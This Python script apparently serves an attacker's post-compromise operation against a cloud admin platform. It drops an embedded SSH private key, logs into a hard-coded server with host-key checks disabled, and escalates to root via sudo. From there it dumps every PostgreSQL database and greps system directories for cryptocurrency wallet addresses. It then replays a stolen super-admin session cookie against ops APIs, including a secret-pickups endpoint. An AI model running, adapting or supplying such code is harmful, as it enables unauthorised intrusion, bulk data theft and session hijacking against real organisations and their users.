# -*- coding: utf-8 -*-
# intent 29581 round E: enumerate all PG databases + full-disk grep for zoofi/EVM addrs; reuse super_admin session for remaining ops APIs.
import os,sys,base64,subprocess,json,re,time,urllib.request,urllib.error
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"; TOKEN="D-hUbeTWwdwMtalSAtr7y9giyDqBGX43lu8nDOIQPEY"
open("/tmp/fk","wb").write(base64.b64decode(KEYB64)); os.chmod("/tmp/fk",0o600)
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
def R(k,v,maxb=80000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def http(path,method="GET",origin=None,timeout=45,maxlen=6000):
    req=urllib.request.Request("https://cloud-admin.lumiiai.cn"+path,method=method)
    req.add_header("User-Agent",UA); req.add_header("Accept","application/json")
    req.add_header("Cookie","lumii_ops_session="+TOKEN)
    if origin: req.add_header("Origin",origin)
    try:
        r=urllib.request.urlopen(req,timeout=timeout); return {"code":r.getcode(),"body":r.read().decode("utf-8","replace")[:maxlen]}
    except urllib.error.HTTPError as e: return {"code":e.code,"body":e.read().decode("utf-8","replace")[:1500]}
    except Exception as e: return {"code":-1,"body":repr(e)}
SCRIPT = r"""
set +e
echo "@@@DBS"; sudo -u postgres psql -At -c "select datname||' '||pg_size_pretty(pg_database_size(datname)) from pg_database order by 1" 2>&1 | head -40
echo "@@@VERIFYDUMP"; ls -la /tmp/c.sql 2>/dev/null; grep -ac 'acct_DoaagK2BkFcanyYXo47qe' /tmp/c.sql 2>/dev/null
echo "@@@DUMPOTHERS"
for db in $(sudo -u postgres psql -At -c "select datname from pg_database where datname not in ('postgres','template0','template1')" 2>/dev/null); do
  sz=$(sudo -u postgres psql -At -c "select pg_database_size('$db')" 2>/dev/null)
  echo "-- $db size=$sz"
  if [ "${sz:-0}" -lt 600000000 ]; then
    sudo -u postgres pg_dump -d "$db" --no-owner --no-privileges > /tmp/d_$db.sql 2>/tmp/d_$db.err
    echo "  dumpbytes=$(wc -c < /tmp/d_$db.sql) err=$(head -c 100 /tmp/d_$db.err)"
    grep -aoE '.{0,60}(zoofi|wandfi|wand-index|0xC56f7063|0xFE18Aa1E).{0,60}' /tmp/d_$db.sql | sort -u | head -12
  fi
done
echo "@@@DISKGREP"
timeout 240 grep -rlaE '0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|zoofi|wandfi|wand-index' /data /opt /root /home /srv /var/lib/docker /etc /tmp 2>/dev/null | grep -viE 'node_modules|/\.git/' | head -40
echo "@@@UPDATEDIR"; ls -la /data/lumii-shared/registry 2>/dev/null | head -20; echo "--updates--"; ls -la /data/lumii-shared/registry/updates 2>/dev/null | head -20
echo "@@@DONE"
"""
def run(cmd,timeout=560):
    try:
        p=subprocess.run(cmd,input=SCRIPT.encode(),capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
a=["ssh","-i","/tmp/fk","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=15","-o","IdentitiesOnly=yes","ubuntu@43.143.107.214","sudo -n bash -s"]
rc,o,e=run(a,timeout=580)
R("meta",{"rc":rc,"err":e[-400:],"outlen":len(o)})
parts=re.split(r'@@@([A-Z0-9_]+)',o)
for i in range(1,len(parts),2):
    R(parts[i].lower(), parts[i+1] if i+1<len(parts) else "")
R("api_pickups",http("/v1/ops/registry/secret-pickups"))
R("api_events",http("/v1/ops/platform-events"))
R("api_provsum",http("/v1/ops/provision-jobs/summary"))
R("api_lumii_profile",http("/v1/ops/registry/enterprises/lumii/center-profile"))
R("api_aro_profile",http("/v1/ops/registry/enterprises/aro/center-profile"))
R("api_me2",http("/v1/ops/me"))
R("done",{"t":int(time.time())})
